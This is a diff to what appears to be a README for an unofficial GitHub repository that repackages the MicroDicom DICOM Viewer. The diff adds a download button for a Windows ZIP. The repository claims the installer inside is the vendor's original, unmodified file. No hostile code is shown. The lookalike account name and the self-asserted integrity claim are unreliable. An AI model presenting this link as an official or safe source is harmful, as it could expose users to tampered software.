@@ -13,6 +13,12 @@
 
 <p align="center"><strong>DICOM viewer</strong> | <strong>Windows</strong> | <strong>ZIP package</strong> | <strong>Signed installer</strong></p>
 
+<p align="center">
+  <a href="https://github.com/MicroDicoms/microdicom-dicom-viewer/releases/download/2026.5/MicroDicom-DICOM-Viewer-2026.5-Windows.zip">
+    <img src="assets/download-zip.svg" alt="Download MicroDicom DICOM Viewer 2026.5 for Windows">
+  </a>
+</p>
+
 Release page and downloadable packaging for MicroDicom DICOM Viewer 2026.5 on Windows. The application installer is the original EXE downloaded from Microdicom ltd's official website. It has not been modified; its Authenticode signature and SHA-256 are listed below.
 
 - Product page: https://microdicoms.github.io/microdicom-dicom-viewer/
